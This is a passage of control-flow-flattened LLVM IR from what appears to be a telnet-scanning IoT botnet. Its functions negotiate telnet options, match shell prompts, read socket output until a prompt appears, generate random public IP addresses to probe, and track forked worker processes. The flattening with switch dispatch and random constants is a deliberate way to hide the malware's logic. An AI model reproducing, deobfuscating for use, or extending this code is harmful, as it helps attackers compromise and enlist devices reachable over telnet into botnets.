; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -526027684, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1643337389, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #4
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 1759901724, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1493842894, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1493842894, label %NodeBlock
    i32 1339097640, label %LeafBlock1
    i32 2142463344, label %LeafBlock
    i32 -1378818501, label %16
    i32 -944525991, label %17
    i32 -1519978036, label %26
    i32 -1845342641, label %27
    i32 -1909935137, label %34
    i32 1201536468, label %35
    i32 1810976307, label %42
    i32 1346921490, label %50
    i32 -1884637392, label %58
    i32 -1758864134, label %59
    i32 2049070092, label %60
    i32 -1236232259, label %NewDefault
    i32 223531861, label %67
    i32 -107799880, label %68
    i32 -894837212, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 2142463344, i32 1339097640
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -1378818501, i32 -1236232259
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -944525991, i32 -1236232259
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -894837212, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -1519978036, i32 -1845342641
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 2049070092, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -1909935137, i32 1201536468
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1758864134, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 1810976307, i32 1346921490
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 -1884637392, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 -1884637392, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1758864134, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 2049070092, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -107799880, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 223531861, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -107799880, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -894837212, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 9098806, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 9098806, label %11
    i32 1084995260, label %18
    i32 1240795908, label %19
    i32 -1531234431, label %24
    i32 -1738277197, label %37
    i32 -149098160, label %50
    i32 1285455293, label %63
    i32 -472125061, label %75
    i32 2123193823, label %76
    i32 1587548362, label %78
    i32 1158906331, label %81
    i32 -1484545591, label %100
    i32 638645079, label %101
    i32 880944551, label %102
    i32 59346624, label %105
    i32 1818458516, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 1084995260, i32 59346624
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 1240795908, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 -1531234431, i32 2123193823
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -472125061, i32 -1738277197
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -472125061, i32 -149098160
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -472125061, i32 1285455293
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -472125061, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 2123193823, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 1587548362, i32 1158906331
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 1240795908, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 -1484545591, i32 638645079
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1818458516, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 880944551, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 9098806, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1818458516, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 1340351738, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1340351738, label %33
    i32 -1665760622, label %39
    i32 1819985405, label %44
    i32 718002640, label %48
    i32 -685828238, label %49
    i32 -893337693, label %51
    i32 -973842100, label %52
    i32 245775551, label %61
    i32 1824827132, label %78
    i32 1323749766, label %79
    i32 1619067106, label %91
    i32 703448200, label %95
    i32 922275455, label %96
    i32 1796122062, label %105
    i32 1465681837, label %114
    i32 16758934, label %118
    i32 314073429, label %119
    i32 -926158606, label %128
    i32 1697249063, label %129
    i32 -816785504, label %130
    i32 -1049365351, label %136
    i32 28726697, label %140
    i32 -1146684970, label %145
    i32 898119991, label %146
    i32 1911005932, label %147
    i32 -1924099199, label %148
    i32 1943369413, label %152
    i32 1158859169, label %153
    i32 -807098645, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -1665760622, i32 -685828238
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 718002640, i32 1819985405
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 718002640, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -685828238, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -893337693, i32 -1924099199
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -973842100, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #4, !srcloc !4
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 245775551, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 1824827132, i32 1323749766
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1924099199, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 703448200, i32 1619067106
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 703448200, i32 922275455
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -807098645, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 1796122062, i32 -816785504
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 16758934, i32 1465681837
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 16758934, i32 314073429
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -807098645, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 1697249063, i32 -926158606
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -807098645, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 1911005932, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 -1146684970, i32 -1049365351
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 28726697, i32 898119991
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 -1146684970, i32 898119991
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 -1924099199, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 1911005932, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 1340351738, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1943369413, i32 1158859169
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 -807098645, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -807098645, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1984453559, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1984453559, label %first
    i32 -877152059, label %8
    i32 1507179369, label %13
    i32 -505351322, label %29
    i32 1873835593, label %39
    i32 2119405798, label %44
    i32 140885756, label %49
    i32 -1163988271, label %54
    i32 -1729714355, label %59
    i32 549384816, label %64
    i32 -736355323, label %69
    i32 399949339, label %74
    i32 358995575, label %79
    i32 844956702, label %84
    i32 -804949240, label %89
    i32 -201821893, label %94
    i32 -1694375651, label %99
    i32 1488836305, label %104
    i32 1896601739, label %109
    i32 -1038717932, label %114
    i32 -2017503171, label %119
    i32 -1295795089, label %124
    i32 -688139729, label %129
    i32 -278983014, label %134
    i32 1474355984, label %139
    i32 293791177, label %144
    i32 65780278, label %149
    i32 1833825475, label %154
    i32 1517933539, label %159
    i32 1460996063, label %164
    i32 -1576079580, label %169
    i32 1491357411, label %174
    i32 263484284, label %179
    i32 2061187920, label %183
    i32 -861096020, label %185
    i32 -1213174608, label %195
    i32 1777697900, label %207
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp sgt i32 %.reload, 0
  %7 = select i1 %6, i32 -877152059, i32 -505351322
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %10 = zext i8 %9 to i32
  %11 = icmp slt i32 %10, 255
  %12 = select i1 %11, i32 1507179369, i32 -505351322
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %15 = add i8 %14, 1
  store i8 %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %16 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 16, i1 false)
  %17 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %19, i32 %21, i32 %23, i32 %25)
  %27 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %28 = call i32 @inet_addr(i8* %27) #4
  store i32 %28, i32* %1, align 4
  store i32 1777697900, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = call i32 @rand() #4
  %31 = srem i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %33 = call i32 @rand() #4
  %34 = srem i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %36 = call i32 @rand() #4
  %37 = srem i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
